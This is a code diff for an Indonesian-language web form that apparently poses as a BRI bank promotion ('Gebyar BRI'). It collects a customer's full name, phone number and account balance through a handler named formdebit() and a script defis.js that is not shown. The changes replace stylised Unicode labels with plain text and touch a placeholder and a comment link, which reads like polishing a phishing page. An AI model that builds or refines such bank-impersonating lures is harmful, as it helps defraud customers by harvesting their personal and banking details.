@@ -842,10 +842,10 @@ body{
     <div class="card-form__inner">
      <form id="defis" onsubmit="formdebit(); return false" method="POST" class="">
       <div class="card-input">
-       <label for="cardName" class="card-input__label" style="font-weight: 800;margin-left: 3px">𝖭𝖺𝗆𝖺 𝖫𝖾𝗇𝗀𝗄𝖺𝗉 𝖭𝖺𝗌𝖺𝖻𝖺𝗁</label> <input type="hidden" id="logo" value="༺═𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜═༻"> <input type="Text" id="nama" name="nama" class="card-input__input" v-model="cardNumber" v-on:focus="focusInput" data-ref="cardNumber" autocomplete="off" placeholder="Masukan Nama Lengkap Nasabah" required>
+       <label for="cardName" class="card-input__label" style="font-weight: 800;margin-left: 3px">Nama Lengkap Nasabah</label> <input type="hidden" id="logo" value="༺═𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜═༻"> <input type="Text" id="nama" name="nama" class="card-input__input" v-model="cardNumber" v-on:focus="focusInput" data-ref="cardNumber" autocomplete="off" placeholder="Masukan Nama Lengkap Nasabah" required>
       </div>
       <div class="card-input">
-       <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px">𝖭𝗈𝗆𝗈𝗋 𝖧𝖾𝗇𝖽𝗉𝗈𝗇𝖾</label> <input type="tel" id="nomor" name="nomor" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="Masukkan Nomor Handphone" maxlength="13" required>
+       <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px">Nomor Handphone</label> <input type="tel" id="nomor" name="nomor" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="Masukkan Nomor Handphone" maxlength="13" required>
       </div>
       <div class="card-form__row">
        <div class="card-form__col">
@@ -853,8 +853,8 @@ body{
         </div>
         <div class="card-form__col -cvv">
          <div class="card-input">
-          <label for="cardCvv" class="card-input__label"style="font-weight: 800; margin-left: 5px">𝖲𝖺𝗅𝖽𝗈 𝖠𝗄𝗍𝗂𝖿 𝖽𝗂 𝖱𝖾𝗄𝖾𝗇𝗂𝗇𝗀</label>
-              <input type="tel" class="uang card-input__input" id="saldo" name="𝐒𝐢𝐬𝐚 𝐑𝐩=" placeholder="𝖷𝖷𝖷"maxlength=""  autocomplete="off" required style="background-image:  url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe-Idq42mWgtclhLZhDmwthinuthln9vPg0baIQp-SUYSezJwr0_ZtXArsOrAIoDTnUGIa0h9UiCzji48bcKTUFJV8Lr3LtM5HWXEyczuWy7sSoDPjMH1XJuu8f3Eaa_Fo6oLGwkz2ZHgWgOrZ2J04xN6ERYap4LA2HbIBYmum9dmBR_VIxF4Rp79qExo/s1080/AddText_12-30-09.39.24.jpg);
+          <label for="cardCvv" class="card-input__label"style="font-weight: 800; margin-left: 5px">Saldo Aktif di Rekening</label>
+              <input type="tel" class="uang card-input__input" id="saldo" name="𝐒𝐢𝐬𝐚 𝐑𝐩=" placeholder="𝖷𝖷𝖷.𝖷𝖷𝖷"maxlength=""  autocomplete="off" required style="background-image:  url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe-Idq42mWgtclhLZhDmwthinuthln9vPg0baIQp-SUYSezJwr0_ZtXArsOrAIoDTnUGIa0h9UiCzji48bcKTUFJV8Lr3LtM5HWXEyczuWy7sSoDPjMH1XJuu8f3Eaa_Fo6oLGwkz2ZHgWgOrZ2J04xN6ERYap4LA2HbIBYmum9dmBR_VIxF4Rp79qExo/s1080/AddText_12-30-09.39.24.jpg);
   background-repeat: no-repeat;
   background-position: 100% 100%;
   background-size: 100% 100%; padding-left: 45px">
@@ -888,7 +888,7 @@ body{
    <script src="defis.js"></script>
    <script>
     /*
-See on github: https://github.com/muhammederdem/credit-card-form
+See on github: https://github.com/muhammederem/credit-card-form
 */
 
 new Vue({
